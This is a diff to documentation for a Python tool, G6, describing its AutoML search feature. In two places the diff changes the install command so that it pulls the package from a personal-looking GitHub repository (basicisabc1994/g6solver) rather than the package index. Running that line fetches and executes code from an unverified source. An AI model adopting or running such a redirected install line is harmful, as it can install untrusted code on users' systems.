@@ -107,7 +107,7 @@ Composed:
 
 ## What it needs
 
-- `pip install "g6[automl]"` (FLAML's tuner, MIT, with NumPy; scikit-learn, BSD-3-Clause). Without it `search` is
+- `pip install "g6[automl] @ git+https://github.com/basicisabc1994/g6solver"` (FLAML's tuner, MIT, with NumPy; scikit-learn, BSD-3-Clause). Without it `search` is
   refused with `G6_E_ML_BACKEND_NOT_INSTALLED` and the install line; the checks before a search still run and
   `backends` still answers.
 - No model, no network access, no outside program; the search runs in a child of G6's own Python behind the
@@ -145,7 +145,7 @@ print(found["warning_card"]["message"])
 if found["completion_state"] == "qualified-draft":
     assert found["chosen"] in ("ridge", "random_forest") and found["headline"]["metric"] == "r2"
 else:
-    assert found["code"] == "G6_E_ML_BACKEND_NOT_INSTALLED"   # pip install "g6[automl]"
+    assert found["code"] == "G6_E_ML_BACKEND_NOT_INSTALLED"   # pip install "g6[automl] @ git+https://github.com/basicisabc1994/g6solver"
 ```
 
 ## The four open problems
